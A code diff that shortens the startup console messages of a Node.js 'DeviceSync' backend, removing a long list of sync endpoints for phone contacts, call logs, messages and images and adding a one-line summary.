-    console.log(`\n🚀 DeviceSync Backend Server running on http://localhost:${PORT}`);
+    console.log(`🚀 DeviceSync Backend Server running on http://localhost:${PORT}`);
     console.log(`📱 API Base URL: http://localhost:${PORT}/api/`);
     console.log(`🏥 Health Check: http://localhost:${PORT}/api/health`);
     console.log(`📱 For Android Emulator: http://10.0.2.2:${PORT}/api/`);
-    console.log(`📱 For Physical Device: http://192.168.1.14:${PORT}/api/`);
     console.log(`🗄️  Database: MongoDB (sync_data)`);
-    console.log(`\n✅ ALL ENDPOINTS IMPLEMENTED FOR MOBILE APP SYNC`);
-    console.log(`\n📋 Available Endpoints:`);
-    console.log(`   ✅ GET  /api/health                                    - Server health check`);
-    console.log(`   ✅ POST /api/devices                                   - Register device`);
-    console.log(`   ✅ GET  /api/devices                                   - Get all devices`);
-    console.log(`   ✅ GET  /api/devices/:deviceId                         - Get specific device`);
-    console.log(`   ✅ GET  /api/devices/:deviceId/settings                - Get device settings`);
-    console.log(`   ✅ GET  /api/devices/:deviceId/data-types              - Get data types`);
-    console.log(`   ✅ POST /api/devices/:deviceId/sync                    - Sync data (MAIN ENDPOINT)`);
-    console.log(`   ✅ POST /api/devices/:deviceId/sync/:dataType          - Update sync timestamp`);
-    console.log(`   ✅ GET  /api/test/devices/:deviceId/:dataType          - Get synced data`);
-    console.log(`   ✅ POST /api/test/devices/:deviceId/upload-last-5-images - Upload images`);
-    console.log(`\n🎯 MOBILE APP SYNC COMPATIBILITY:`);
-    console.log(`   ✅ Device Registration - WORKING`);
-    console.log(`   ✅ Data Sync (Contacts, Call Logs, Messages, Notifications, Email) - WORKING`);
-    console.log(`   ✅ Settings Management - WORKING`);
-    console.log(`   ✅ Error Handling - COMPREHENSIVE`);
-    console.log(`\n🔧 NETWORK CONFIGURATION:`);
-    console.log(`   📱 Kotlin App Base URL: http://192.168.1.14:5001/api/`);
-    console.log(`   🖥️  Server Listening: 0.0.0.0:5001 (accessible from network)`);
-    console.log(`   🌐 Network Status: READY FOR MOBILE APP CONNECTION`);
-    console.log(`\n🎉 API SYNC ISSUES RESOLVED - MOBILE APP SHOULD NOW WORK PROPERLY!`);
-});
+    console.log(`✅ Core syncing ready: Contacts, CallLogs, Messages, Notifications, EmailAccounts`);
+}); 
